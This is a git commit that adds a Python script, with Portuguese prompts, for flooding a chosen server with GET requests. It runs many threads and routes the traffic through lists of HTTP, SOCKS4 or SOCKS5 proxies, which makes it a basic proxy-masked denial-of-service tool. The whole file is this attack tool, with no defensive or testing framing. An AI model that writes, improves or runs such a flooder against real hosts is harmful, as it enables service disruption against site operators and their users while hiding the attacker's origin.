12fc2ea70a2be85d4cfcf348c404bf4980d06117
CodeZntt <43300677+CodeZntt@users.noreply.github.com>
2023-02-06 21:14:33 -0300

    Add files via upload

---
+++ thunder_proxy_all_types_de_proxys.py
@@ -0,0 +1,53 @@
+import requests
+import time
+import threading
+
+def send_get_request(url, port, proxy_type, proxy):
+    try:
+        if proxy_type == "http":
+            proxies = {"http": proxy}
+        elif proxy_type == "socks4":
+            proxies = {"http": f"socks4://{proxy}"}
+        elif proxy_type == "socks5":
+            proxies = {"http": f"socks5://{proxy}"}
+
+        response = requests.get(f"{url}:{port}", proxies=proxies)
+        if response.status_code == 200:
+            print(f"Solicitação bem-sucedida com proxy {proxy}!")
+        else:
+            print(f"Erro na solicitação com proxy {proxy}: código de status {response.status_code}")
+    except requests.exceptions.RequestException as e:
+        print(f"Erro na solicitação com proxy {proxy}: {e}")
+
+def flood_requests(url, port, num_requests, requests_per_second, proxy_type, proxy):
+    interval = 1 / requests_per_second
+
+    for i in range(num_requests):
+        send_get_request(url, port, proxy_type, proxy)
+        time.sleep(interval)
+
+def main():
+    url = input("Digite o URL do servidor remoto: ")
+    port = input("Digite a porta específica: ")
+    num_requests = int(input("Quantas solicitações você deseja enviar? "))
+    requests_per_second = int(input("Quantas solicitações por segundo você deseja fazer? "))
+    num_threads = int(input("Quantas threads você deseja usar para enviar solicitações? "))
+    proxy_type = input("Digite o tipo de proxy (http, socks4, socks5): ")
+    proxy_file = input("Digite o nome do arquivo com as proxies (formato ip:port por linha): ")
+
+    with open(proxy_file, "r") as f:
+        proxies = f.readlines()
+
+    requests_per_thread = num_requests // num_threads
+
+    threads = []
+    for i in range(num_threads):
+        t = threading.Thread(target=flood_requests, args=(url, port, requests_per_thread, requests_per_second, proxy_type, proxies[i % len(proxies)].strip()))
+        threads.append(t)
+        t.start()
+
+    for t in threads:
+        t.join()
+
+if __name__ == '__main__':
+    main()
